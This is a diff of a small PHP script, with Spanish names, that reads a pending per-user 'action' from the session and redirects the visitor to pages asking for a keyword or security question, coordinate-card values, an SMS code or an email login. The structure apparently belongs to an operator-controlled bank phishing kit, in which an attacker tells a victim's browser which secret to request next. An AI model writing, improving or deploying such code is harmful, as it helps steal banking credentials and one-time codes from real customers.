@@ -1,37 +1,33 @@
 <?php
-if (session_status() === PHP_SESSION_NONE) {
-    session_start();
-}
+session_start();
 
-if (!isset($_SESSION['usuario'])) exit;
+$usuario = $_SESSION['usuario'] ?? null;
 
-$usuario = $_SESSION['usuario'];
-$archivo = "acciones/$usuario.txt";
+if (!$usuario) exit;
 
-if (file_exists($archivo)) {
-    $accion = trim(file_get_contents($archivo));
-    unlink($archivo);
+$accion = $_SESSION["accion_$usuario"] ?? null;
+
+if ($accion) {
+    unset($_SESSION["accion_$usuario"]); // solo una vez
 
     if (str_starts_with($accion, "/palabra clave/")) {
-        $pregunta = explode("/palabra clave/", $accion)[1];
-        $_SESSION['pregunta'] = $pregunta;
+        $_SESSION['pregunta'] = explode("/palabra clave/", $accion)[1];
         header("Location: pregunta.php");
         exit;
     }
 
     if (str_starts_with($accion, "/coordenadas etiquetas/")) {
-        $etiquetas = explode("/coordenadas etiquetas/", $accion)[1];
-        $_SESSION['etiquetas'] = explode(",", $etiquetas);
+        $_SESSION['etiquetas'] = explode(",", explode("/coordenadas etiquetas/", $accion)[1]);
         header("Location: coordenadas.php");
         exit;
     }
 
-    if ($accion == "/SMS") {
+    if ($accion === "/SMS") {
         header("Location: sms.php");
         exit;
     }
 
-    if ($accion == "/CORREO") {
+    if ($accion === "/CORREO") {
         header("Location: correo.php");
         exit;
     }
